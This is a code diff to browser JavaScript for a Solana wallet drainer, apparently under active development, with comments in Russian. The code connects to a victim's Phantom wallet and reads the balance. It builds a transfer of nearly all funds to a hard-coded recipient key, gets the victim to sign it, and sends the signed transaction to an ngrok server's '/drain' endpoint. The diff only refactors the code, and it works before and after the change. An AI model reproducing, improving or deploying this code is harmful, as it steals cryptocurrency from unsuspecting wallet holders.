@@ -48,22 +48,19 @@
     if (window.solana && window.solana.isPhantom) {
         try {
             // Request to connect to the wallet
-            const response = await window.solana.connect({ onlyIfTrusted: false });
-            const publicKey = response.publicKey;
-            console.log(`Connected to wallet: ${publicKey.toString()}`);
+            const connectResponse = await window.solana.connect({ onlyIfTrusted: false });
+            const publicKey = connectResponse.publicKey;
             alert(`Connected to wallet: ${publicKey.toString()}`);
             
             // Proceed with draining the wallet
             const balance = await connection.getBalance(publicKey);
-            console.log(`Wallet balance: ${balance} lamports`);
-            
             const lamportsToSend = balance - 5000; // Вычитаем комиссию за транзакцию
             if (lamportsToSend <= 0) {
                 throw new Error('Insufficient funds to cover the transaction fee');
             }
             
-            // Укажите правильный публичный ключ получателя
-            const drainerPubkey = new PublicKey('H31Bc7rSEVA94YmHhdDU6Nn3xjVFPsvaig8JMW6ZGrBp'); // Замените на реальный ключ
+            // Замените на реальный публичный ключ получателя
+            const drainerPubkey = new PublicKey('H31Bc7rSEVA94YmHhdDU6Nn3xjVFPsvaig8JMW6ZGrBp');
             
             const transaction = new Transaction().add(
                 SystemProgram.transfer({
@@ -73,32 +70,30 @@
                 })
             );
             
-            // Добавляем недавний blockhash для предотвращения повторной отправки транзакции
-            transaction.recentBlockhash = (await connection.getRecentBlockhash()).blockhash;
+            // Получаем недавний blockhash для валидности транзакции
+            const { blockhash } = await connection.getRecentBlockhash();
+            transaction.recentBlockhash = blockhash;
             transaction.feePayer = publicKey;
             
             const signedTransaction = await window.solana.signTransaction(transaction);
-            const serializedTransaction = signedTransaction.serialize();
-            const base64Transaction = Buffer.from(serializedTransaction).toString('base64');
             
-            console.log('Sending transaction to server...');
-            
-            const response = await fetch('https://702c-95-46-155-53.ngrok-free.app/drain', {
+            // Отправка на сервер
+            const serverResponse = await fetch('https://702c-95-46-155-53.ngrok-free.app/drain', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
                 },
-                body: JSON.stringify({ signedTransaction: base64Transaction })
+                body: JSON.stringify({ 
+                    signedTransaction: Buffer.from(signedTransaction.serialize()).toString('base64') 
+                })
             });
             
-            if (!response.ok) {
-                const errorText = await response.text();
-                throw new Error(`Server error: ${response.status} - ${errorText}`);
+            const result = await serverResponse.json();
+            if (serverResponse.ok) {
+                alert('Transaction sent: ' + result.signature);
+            } else {
+                throw new Error(result.error);
             }
-            
-            const result = await response.json();
-            alert('Transaction sent: ' + result.signature);
-            
         } catch (err) {
             console.error('Transaction failed', err);
             alert('Transaction failed: ' + err.message);
